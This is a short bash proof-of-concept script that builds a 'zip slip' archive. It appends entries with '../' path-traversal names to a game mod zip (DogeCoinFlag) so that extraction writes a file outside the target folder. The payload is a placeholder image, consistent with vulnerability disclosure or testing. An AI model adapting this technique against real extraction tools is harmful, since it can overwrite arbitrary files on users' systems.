#!/bin/bash

# Create temp folder to work in
TMPBASE=/tmp/PoC/a/b/c/d
mkdir -p "$TMPBASE/DogeCoinFlag-1.01/GameData/DogeCoinFlag/Flags"

# Create the file that will be written outside the directory
touch "$TMPBASE/DogeCoinFlag-1.01/GameData/DogeCoinFlag/dogecoin2.png"
touch "$TMPBASE/dogecoin2.png"

# Copy an archive to working dir
cp DogeCoinFlag-1.01.zip "$TMPBASE/DogeCoinFlag-1.01-zip-slip.zip"

# Go to working directory
cd "$TMPBASE"

# Add files using relative path
zip -r DogeCoinFlag-1.01-zip-slip.zip DogeCoinFlag-1.01/GameData/DogeCoinFlag/Flags/../dogecoin2.png
zip -r DogeCoinFlag-1.01-zip-slip.zip DogeCoinFlag-1.01/GameData/DogeCoinFlag/Flags/../../../../../dogecoin2.png
